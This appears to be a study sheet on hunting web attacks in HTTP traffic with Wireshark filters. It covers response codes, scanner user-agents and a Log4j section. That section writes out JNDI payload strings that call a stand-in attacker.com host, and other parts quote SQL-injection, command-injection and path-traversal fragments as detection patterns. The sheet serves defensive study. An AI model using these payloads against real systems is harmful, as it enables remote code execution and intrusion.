# HTTP Analysis - Quick Summary

## Why HTTP Matters for Security

**HTTP = Hypertext Transfer Protocol** - The backbone of web traffic, completely **unencrypted cleartext**, and **never blocked** by default.

### Common Attacks Detected via HTTP Analysis:
- 🚨 **Phishing pages** - Fake login sites
- 🚨 **Web attacks** - SQL injection, XSS, etc.
- 🚨 **Data exfiltration** - Stealing data via HTTP
- 🚨 **Command & Control (C2)** - Malware communication

**Note**: HTTP/2 exists (binary, multiplexed, more secure) but HTTP/1.1 is still everywhere.
**Skill**: echo -n "string" | base64 -d
---

## HTTP Request Methods (Know These!)

| Method | Purpose | Filter |
|--------|---------|--------|
| **GET** | Request data from server | `http.request.method == "GET"` |
| **POST** | Send data to server | `http.request.method == "POST"` |
| **PUT** | Upload/update resource | `http.request.method == "PUT"` |
| **DELETE** | Delete resource | `http.request.method == "DELETE"` |

```bash
# Show all HTTP requests
http.request

# Find all POST requests (often attacks)
http.request.method == "POST"
```

---

## HTTP Response Codes (CRITICAL!)

### Success Codes (2xx)
| Code | Meaning | Filter |
|------|---------|--------|
| **200** | OK - Request successful ✅ | `http.response.code == 200` |

### Redirection Codes (3xx)
| Code | Meaning | Filter |
|------|---------|--------|
| **301** | Moved permanently | `http.response.code == 301` |
| **302** | Moved temporarily | `http.response.code == 302` |

### Client Error Codes (4xx) - **RED FLAGS!**
| Code | Meaning | Filter |
|------|---------|--------|
| **400** | Bad request (malformed) | `http.response.code == 400` |
| **401** | Unauthorized (needs login) | `http.response.code == 401` |
| **403** | Forbidden (no access) | `http.response.code == 403` |
| **404** | Not found | `http.response.code == 404` |
| **405** | Method not allowed (blocked) | `http.response.code == 405` |
| **408** | Request timeout | `http.response.code == 408` |

### Server Error Codes (5xx)
| Code | Meaning | Filter |
|------|---------|--------|
| **500** | Internal server error | `http.response.code == 500` |
| **503** | Service unavailable | `http.response.code == 503` |

---

## Key HTTP Fields for Threat Hunting

### 1. **User-Agent** (SUPER IMPORTANT!)
Identifies browser and OS - **attackers often modify this!**

```bash
# Find specific tools in user agent
http.user_agent contains "nmap"
http.user_agent contains "sqlmap"
http.user_agent contains "Nikto"
http.user_agent contains "Wfuzz"

# Find multiple tools at once
(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")
```

### 2. **Request URI** (Where they're going)
```bash
# Look for admin panel access attempts
http.request.uri contains "admin"
http.request.uri contains "login"
http.request.uri contains "upload"

# Full URI (complete path)
http.request.full_uri contains "admin"
```

### 3. **Server & Host**
```bash
# Find specific server types
http.server contains "apache"
http.server contains "nginx"

# Find specific hosts
http.host contains "malicious"
http.host == "attacker-site.com"
```

### 4. **Connection Status**
```bash
# Check connection type
http.connection == "Keep-Alive"
http.connection == "close"
```

### 5. **Cleartext Data**
```bash
# Search in cleartext responses
data-text-lines contains "password"
data-text-lines contains "admin"
```

---

## User-Agent Analysis (Anomaly Detection)

### Red Flags in User-Agent:

🚩 **Different user agents from same host in short time**
- Real users don't switch browsers every 30 seconds!

🚩 **Non-standard user agents**
- Example: `"CustomBot/1.0"` instead of `"Mozilla/5.0..."`

🚩 **Typos in user agent**
- `"Mozlilla"` vs `"Mozilla"` (attacker typo!)

🚩 **Security tools in user agent**
- Nmap, sqlmap, Nikto, Burp Suite, Metasploit

🚩 **Payload data in user agent**
- SQL injection: `"' OR 1=1--"`
- Command injection: `"; whoami;"`

🚩 **Unusual characters**
- `$`, `{`, `}`, `==` (often used in exploits)

```bash
# Hunt for suspicious user agents
(http.user_agent contains "$") or (http.user_agent contains "==")
```

### **CRITICAL RULE:**
❌ **NEVER whitelist a user agent!**
Even if it looks normal, attackers can spoof it perfectly.

---

## Log4j Vulnerability Analysis (Real-World Attack!)

### What is Log4j?
Massive vulnerability (CVE-2021-44228) that allowed **remote code execution** via HTTP headers.

### Attack Pattern:

**Step 1: Attacker sends POST request**
```
POST /login HTTP/1.1
User-Agent: ${jndi:ldap://attacker.com/Exploit}
```

**Step 2: Server logs the user agent**
**Step 3: Log4j processes the malicious string**
**Step 4: Server connects to attacker's LDAP server**
**Step 5: Downloads and executes `Exploit.class`**

### Detection Filters:

```bash
# Find POST requests (Log4j attacks start here)
http.request.method == "POST"

# Look for JNDI strings (the exploit trigger)
(ip contains "jndi") or (ip contains "Exploit")
(frame contains "jndi") or (frame contains "Exploit")

# Look for encoded payloads in user agent
(http.user_agent contains "$") or (http.user_agent contains "==")
(http.user_agent contains "jndi") or (http.user_agent contains "ldap")

# Check any HTTP field for Log4j patterns
http contains "jndi:ldap"
http contains "jndi:rmi"
http contains "${jndi"
```

### Common Log4j Payload Patterns:
```
${jndi:ldap://attacker.com/Exploit}
${jndi:rmi://attacker.com/Exploit}
${jndi:dns://attacker.com/Exploit}
${${lower:jndi}:ldap://attacker.com/a}  (obfuscated)
```

---

## Attack Detection Workflow

### Step 1: Get Overview
```bash
# Basic HTTP traffic
http

# See all requests
http.request

# See all responses
http.response
```

### Step 2: Hunt for Suspicious Activity
```bash
# Look for scanning tools
http.user_agent contains "nmap"

# Look for admin panel access
http.request.uri contains "admin"

# Look for error responses (attacker probing)
http.response.code == 404
http.response.code == 403
```

### Step 3: Analyze User-Agents
```bash
# All user agents
http.user_agent

# Statistics → HTTP → Requests (see user agent distribution)
```

### Step 4: Check for Exploits
```bash
# Log4j
http contains "jndi"

# SQL injection in URIs
http.request.uri contains "' OR"
http.request.uri contains "UNION SELECT"

# Command injection
http.request.uri contains "whoami"
http.request.uri contains "/etc/passwd"
```

### Step 5: Follow the Trail
```bash
# Right-click packet → Follow → HTTP Stream
# See full request and response in cleartext
```

---

## Common Attack Patterns

### 1. **Web Scanning**
```
Indicator: Multiple 404s from same IP
Filter: http.response.code == 404
Look for: Rapid requests to many different URIs
```

### 2. **SQL Injection**
```
Indicator: SQL keywords in URIs
Filter: http.request.uri contains "SELECT"
        http.request.uri contains "UNION"
        http.request.uri contains "' OR 1=1"
```

### 3. **Directory Traversal**
```
Indicator: Path manipulation attempts
Filter: http.request.uri contains "../"
        http.request.uri contains "/etc/passwd"
```

### 4. **Command Injection**
```
Indicator: Shell commands in parameters
Filter: http.request.uri contains "whoami"
        http.request.uri contains "; ls"
```

### 5. **Credential Stuffing**
```
Indicator: Many POST requests to /login
Filter: (http.request.method == "POST") and (http.request.uri contains "login")
```

---

## Red Flags Summary

🚩 **High volume of 404s** - Scanning/enumeration  
🚩 **Audit tools in user-agent** - Nmap, sqlmap, Nikto  
🚩 **Special characters in URIs** - ', ", <, >, $, ;  
🚩 **POST to unusual endpoints** - /admin, /config, /backup  
🚩 **Multiple user agents from one IP** - Spoofing attempts  
🚩 **JNDI strings anywhere** - Log4j exploitation  
🚩 **Base64 in parameters** - Encoded payloads  
🚩 **Repeated 401/403 responses** - Brute force/unauthorized access  

---

## Quick Filter Cheat Sheet

```bash
# Basic
http                                    # All HTTP traffic
http.request                            # All requests
http.response                           # All responses

# Methods
http.request.method == "POST"           # POST requests
http.request.method == "GET"            # GET requests

# Response codes
http.response.code == 200               # Success
http.response.code == 404               # Not found
http.response.code == 403               # Forbidden

# User Agent hunting
http.user_agent contains "nmap"         # Find tools
(http.user_agent contains "$")          # Suspicious chars

# URI hunting
http.request.uri contains "admin"       # Admin access
http.request.full_uri contains "admin"  # Full path

# Log4j detection
http contains "jndi"                    # Log4j exploit
(frame contains "jndi") or (frame contains "Exploit")

# Server/Host
http.host == "malicious.com"            # Specific host
http.server contains "apache"           # Server type
```

---
## **Typical questions:**
1. What scanning tools were used? (check user-agent)
2. What admin panels were accessed? (check URIs)
3. Were there any Log4j attempts? (check for jndi)
4. What was the attacker's IP? (check source IPs with suspicious activity)
5. What files were uploaded? (check POST requests)

## **Your approach:**
```
1. http.user_agent                       # Find tools
2. http.request.uri contains "admin"     # Find targets
3. http contains "jndi"                  # Find exploits
4. Statistics → Conversations            # Find chattiest hosts
5. Follow HTTP Stream                    # See full attack
```

---

## Key Takeaways

✅ **HTTP = cleartext** - Everything is visible  
✅ **User-Agent is gold** - Reveals tools and intent  
✅ **Response codes tell stories** - 404s = scanning, 200s = success  
✅ **POST requests = data submission** - Often attacks  
✅ **Never trust user agents** - Easy to spoof  
✅ **Log4j = look for "jndi"** - Still actively exploited  
✅ **Statistics are your friend** - Patterns emerge in volume  

---
